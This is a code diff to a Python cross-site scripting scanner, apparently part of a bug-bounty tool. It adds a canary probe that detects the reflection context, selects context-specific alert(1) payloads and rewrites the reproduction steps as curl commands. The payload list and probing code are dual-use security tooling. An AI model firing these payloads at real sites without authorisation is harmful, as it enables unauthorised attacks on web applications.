@@ -30,8 +30,6 @@ XSS_PAYLOADS = [
     '<svg/onload=alert(1)>',
     '"><img src=x onerror=alert(1)>',
     "';alert(1)//",
-    '{{7*7}}',
-    '${7*7}',
     '<script>alert(1)</script>',
     '"><script>alert(1)</script>',
     "javascript:alert(1)",
@@ -102,18 +100,58 @@ class XSSScanner(ScannerBase):
             reflected.extend(bypass)
         return self._payloads
 
+    # ── Canary pre-probe for context detection ───────────────────────────
+
+    _CANARY_BASE = "BBH_CANARY_"
+
+    def _probe_context(self, url: str, param: str) -> str | None:
+        """Send innocuous canary string, detect where it appears in response."""
+        import uuid
+        canary = self._CANARY_BASE + uuid.uuid4().hex[:8]
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query, keep_blank_values=True)
+        qs[param] = [canary]
+        new_qs = urlencode(qs, doseq=True)
+        test_url = urlunparse(parsed._replace(query=new_qs))
+        resp = self._safe_get(test_url)
+        if not resp or canary not in resp.text:
+            return None
+        body = resp.text
+        escaped = re.escape(canary)
+        if re.search(rf"<script\b[^>]*>.*?</script>", body, re.DOTALL) and canary in body:
+            return "javascript"
+        m = re.search(rf'<[^>]+?\s+[\w:-]+\s*=\s*["\'][^"\']*{escaped}', body)
+        if m:
+            attr_full = m.group(0)
+            if re.search(r'\b(href|src|action|formaction)\s*=', attr_full, re.IGNORECASE):
+                return "url"
+            return "attribute"
+        if canary in body:
+            return "html"
+        return None
+
     # ── Detection phase ─────────────────────────────────────────────────
 
     def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
         payloads = self._get_payloads()
-        reflected = payloads.get("reflected", XSS_PAYLOADS)
-
-        test_payloads = reflected
         if parameter is None:
             params = list(parse_qs(urlparse(url).query).keys())
             if not params:
                 return None
             parameter = params[0]
+
+        context = self._probe_context(url, parameter)
+        if context is None:
+            context = "html"
+
+        context_payloads = payloads.get("context", CONTEXT_PAYLOADS)
+        category_map = {
+            "html": context_payloads.get("html", ['<img src=x onerror=alert(1)>']),
+            "attribute": context_payloads.get("attribute", ['" onfocus=alert(1) autofocus= ']),
+            "javascript": context_payloads.get("javascript", ["';alert(1)//"]),
+            "url": context_payloads.get("url", ["javascript:alert(1)"]),
+        }
+        test_payloads = category_map.get(context, payloads.get("reflected", XSS_PAYLOADS))
 
         for payload in test_payloads[:5]:
             parsed = urlparse(url)
@@ -126,9 +164,7 @@ class XSSScanner(ScannerBase):
             if not resp:
                 continue
 
-            body = resp.text
-            context = self._detect_context(body, payload)
-            if context:
+            if self._detect_context(resp.text, payload):
                 return DetectionResult(
                     url=url,
                     parameter=parameter,
@@ -225,17 +261,14 @@ class XSSScanner(ScannerBase):
     def generate_reproduction(self, detection: DetectionResult, verified: bool = False) -> list[str]:
         if verified:
             return [
-                f"Visit {detection.url}",
-                f"Submit payload '{detection.payload}' in parameter '{detection.parameter}'",
-                f"Observe that the payload is reflected in a {detection.context} context",
-                "Payload was executed in a headless Chromium browser — alert() or DOM mutation confirmed",
-                "In a real attack, this payload would execute in any victim's browser visiting the affected URL",
+                f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
+                f"Payload '{detection.payload}' was executed in a headless Chromium browser — alert() or DOM mutation confirmed in {detection.context} context",
+                "In a real attack, this payload would execute in any victim's browser visiting the affected URL, enabling session hijacking, data theft, or account takeover",
             ]
         return [
-            f"Visit {detection.url}",
-            f"Submit payload '{detection.payload}' in parameter '{detection.parameter}'",
-            f"Observe that the payload is reflected in a {detection.context} context",
-            "Manually verify by pasting the payload into the parameter in a browser and checking for script execution",
+            f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
+            f"Observe that the payload is reflected in a {detection.context} context — unsanitized output confirms XSS",
+            "An attacker can inject arbitrary JavaScript to steal cookies, capture keystrokes, or perform actions on behalf of the victim",
         ]
 
     # ── Stored XSS detection ────────────────────────────────────────────
